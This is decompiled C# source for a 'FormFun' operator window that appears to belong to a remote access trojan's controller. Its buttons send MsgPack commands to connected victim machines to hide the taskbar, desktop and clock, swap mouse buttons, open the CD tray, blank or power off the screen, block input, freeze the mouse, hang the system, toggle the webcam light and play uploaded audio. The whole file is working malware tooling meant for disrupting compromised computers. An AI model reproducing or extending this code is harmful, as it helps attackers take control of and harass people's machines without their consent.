﻿using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Server.Connection;
using Server.MessagePack;

namespace Server.Forms
{
	// Token: 0x02000080 RID: 128
	public partial class FormFun : Form
	{
		// Token: 0x060003C7 RID: 967 RVA: 0x00003FC2 File Offset: 0x000021C2
		public FormFun()
		{
			this.InitializeComponent();
		}

		// Token: 0x170000BF RID: 191
		// (get) Token: 0x060003C8 RID: 968 RVA: 0x00003FD0 File Offset: 0x000021D0
		// (set) Token: 0x060003C9 RID: 969 RVA: 0x00003FD8 File Offset: 0x000021D8
		public Form1 F { get; set; }

		// Token: 0x170000C0 RID: 192
		// (get) Token: 0x060003CA RID: 970 RVA: 0x00003FE1 File Offset: 0x000021E1
		// (set) Token: 0x060003CB RID: 971 RVA: 0x00003FE9 File Offset: 0x000021E9
		internal Clients Client { get; set; }

		// Token: 0x170000C1 RID: 193
		// (get) Token: 0x060003CC RID: 972 RVA: 0x00003FF2 File Offset: 0x000021F2
		// (set) Token: 0x060003CD RID: 973 RVA: 0x00003FFA File Offset: 0x000021FA
		internal Clients ParentClient { get; set; }

		// Token: 0x060003CE RID: 974 RVA: 0x0001F604 File Offset: 0x0001D804
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!this.ParentClient.TcpClient.Connected || !this.Client.TcpClient.Connected)
				{
					base.Close();
				}
			}
			catch
			{
			}
		}

		// Token: 0x060003CF RID: 975 RVA: 0x0001F650 File Offset: 0x0001D850
		private void button1_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "Taskbar+";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x060003D0 RID: 976 RVA: 0x0001F698 File Offset: 0x0001D898
		private void button2_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "Taskbar-";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x060003D1 RID: 977 RVA: 0x0001F6E0 File Offset: 0x0001D8E0
		private void button3_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "Desktop+";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x060003D2 RID: 978 RVA: 0x0001F728 File Offset: 0x0001D928
		private void button4_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "Desktop-";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x060003D3 RID: 979 RVA: 0x0001F770 File Offset: 0x0001D970
		private void button5_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "Clock+";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x060003D4 RID: 980 RVA: 0x0001F7B8 File Offset: 0x0001D9B8
		private void button6_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "Clock-";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x060003D5 RID: 981 RVA: 0x0001F800 File Offset: 0x0001DA00
		private void button8_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "swapMouseButtons";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x060003D6 RID: 982 RVA: 0x0001F848 File Offset: 0x0001DA48
		private void button7_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "restoreMouseButtons";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x060003D7 RID: 983 RVA: 0x0001F890 File Offset: 0x0001DA90
		private void button10_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "openCD+";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x060003D8 RID: 984 RVA: 0x0001F8D8 File Offset: 0x0001DAD8
		private void button9_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "openCD-";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x060003D9 RID: 985 RVA: 0x0001F920 File Offset: 0x0001DB20
		private void button18_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "blankscreen+";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x060003DA RID: 986 RVA: 0x0001F968 File Offset: 0x0001DB68
		private void button17_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "blankscreen-";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x060003DB RID: 987 RVA: 0x0001F9B0 File Offset: 0x0001DBB0
		private void button11_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "blockInput";
			msgPack.ForcePathObject("Time").AsString = this.numericUpDown1.Value.ToString();
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x060003DC RID: 988 RVA: 0x0001FA18 File Offset: 0x0001DC18
		private void button15_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "holdMouse";
			msgPack.ForcePathObject("Time").AsString = this.numericUpDown2.Value.ToString();
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x060003DD RID: 989 RVA: 0x0001FA80 File Offset: 0x0001DC80
		private void button12_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "monitorOff";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x060003DE RID: 990 RVA: 0x0001FAC8 File Offset: 0x0001DCC8
		private void button14_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "hangSystem";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x060003DF RID: 991 RVA: 0x00002239 File Offset: 0x00000439
		private void button13_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060003E0 RID: 992 RVA: 0x00004003 File Offset: 0x00002203
		private void FormFun_FormClosed(object sender, FormClosedEventArgs e)
		{
			ThreadPool.QueueUserWorkItem(delegate(object o)
			{
				Clients client = this.Client;
				if (client == null)
				{
					return;
				}
				client.Disconnected();
			});
		}

		// Token: 0x060003E1 RID: 993 RVA: 0x0001FB10 File Offset: 0x0001DD10
		private void button19_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "webcamlight+";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x060003E2 RID: 994 RVA: 0x0001FB58 File Offset: 0x0001DD58
		private void button16_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "webcamlight-";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x060003E3 RID: 995 RVA: 0x0001FBA0 File Offset: 0x0001DDA0
		private void button13_Click_1(object sender, EventArgs e)
		{
			using (OpenFileDialog openFileDialog = new OpenFileDialog())
			{
				openFileDialog.Filter = "(*.wav)|*.wav";
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					byte[] asBytes = File.ReadAllBytes(openFileDialog.FileName);
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "playAudio";
					msgPack.ForcePathObject("wavfile").SetAsBytes(asBytes);
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
				else
				{
					MessageBox.Show("Please choose a wav file.");
				}
			}
		}
	}
}
